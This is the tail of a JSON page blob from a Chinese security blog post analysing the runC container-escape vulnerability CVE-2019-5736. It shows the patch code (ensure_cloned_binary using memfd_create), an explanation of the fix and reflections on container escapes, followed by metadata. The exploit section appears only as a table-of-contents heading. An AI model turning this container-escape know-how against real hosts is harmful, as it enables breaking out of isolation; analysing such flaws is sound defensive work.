class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token comment\">/*\n\t * We need to re-exec if we are not in a cloned binary. This is necessary\n\t * to ensure that containers won't be able to access the host binary\n\t * through /proc/self/exe. See CVE-2019-5736.\n\t */</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">ensure_cloned_binary</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token function\">bail</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"could not ensure we are a cloned binary\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token comment\">/* Parse all of the netlink configuration. */</span>\n\t<span class=\"token function\">nl_parse</span><span class=\"token punctuation\">(</span>pipenum<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>config<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>​        可以看到主要是增加了一个ensure_cloned_binary()函数的判断其中主要的逻辑是通过memfd_create来将让runc在容器内执行操作前首先将自己复制成为一个匿名文件，如此在可以达到原来效果的同时，/proc/self/exe无法触达到原本的<br>runC二进制文件。</p>\n<h2 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h2><p>​        为了对容器进行有效控制通过宿主机进行容器内外的进程切换其实是必然的，但是稍有不慎就会导致容器信息外带在进程的上下文中，runC的这个漏洞是一个例子还有一个例子就是docker cp漏洞，它本身也是因为docker-tar进程将相关的共享库内容外带到了宿主机导致了容器逃逸，因此在考虑容器安全问题时，对这些危险进程的监控也是十分必要的。</p>\n","text":"容器进程切换思考前置技术Magic Link​ /proc/目录下存在很多的链接文件，但是在Linux 也存在一种特殊的链接文件，这种文件的大小为0，我们知道普通的链接文件的大小等于链接目标的文件路径...","link":"","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[{"name":"容器安全","slug":"容器安全","count":1,"path":"api/categories/容器安全.json"}],"tags":[{"name":"容器安全","slug":"容器安全","count":1,"path":"api/tags/容器安全.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%AE%B9%E5%99%A8%E8%BF%9B%E7%A8%8B%E5%88%87%E6%8D%A2%E6%80%9D%E8%80%83\"><span class=\"toc-text\">容器进程切换思考</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF\"><span class=\"toc-text\">前置技术</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Magic-Link\"><span class=\"toc-text\">Magic Link</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8C%BF%E5%90%8D%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">匿名文件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#mount-namespace%E6%98%AF%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%9A%84%EF%BC%9F\"><span class=\"toc-text\">mount namespace是如何实现的？</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#runC-nsenter%E6%A8%A1%E5%9D%97\"><span class=\"toc-text\">runC nsenter模块</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\"><span class=\"toc-text\">漏洞分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#poc\"><span class=\"toc-text\">poc</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E8%A1%A5%E4%B8%81\"><span class=\"toc-text\">漏洞补丁</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%80%83\"><span class=\"toc-text\">思考</span></a></li></ol></li></ol>","author":{"name":"RainSec","slug":"blog-author","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"灵活的修改Burp请求","uid":"49976eacba4bfec6b25d67dd692a855b","slug":"灵活的修改Burp请求","date":"2022-03-05T10:38:45.000Z","updated":"2023-04-12T02:36:51.371Z","comments":true,"path":"api/articles/灵活的修改Burp请求.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/burp.png","text":"灵活的修改Burp请求 在日常渗透测试中经常会遇到请求头需要替换、请求或响应内容需要解密等一系列麻烦的事。更换请求头可以通过Burp的Match and Replace功能来实现，加解密也有一些插件可...","link":"","photos":[],"count_time":{"symbolsCount":"1.5k","symbolsTime":"1 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":10,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"BurpSuite","slug":"BurpSuite","count":2,"path":"api/tags/BurpSuite.json"}],"author":{"name":"RainSec","slug":"blog-author","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"RealWorld CTF之qiling框架分析","uid":"c240e7132c70272bfb31ce1eb51c281b","slug":"Qilin框架分析","date":"2022-01-28T10:48:45.000Z","updated":"2023-04-12T02:36:51.371Z","comments":true,"path":"api/articles/Qilin框架分析.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/realworld.png","text":"RealWorld CTF之qiling框架分析qiling​当时题目就给了一个qiling的使用的用例，甚至和官方文档上面的用例差不多因此肯定是库的问题。 #!/usr/bin/env python...","link":"","photos":[],"count_time":{"symbolsCount":"14k","symbolsTime":"13 mins."},"categories":[{"name":"CTF","slug":"CTF","count":1,"path":"api/categories/CTF.json"},{"name":"容器安全","slug":"CTF/容器安全","count":1,"path":"api/categories/CTF/容器安全.json"}],"tags":[{"name":"CTF","slug":"CTF","count":1,"path":"api/tags/CTF.json"}],"author":{"name":"RainSec","slug":"blog-author","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}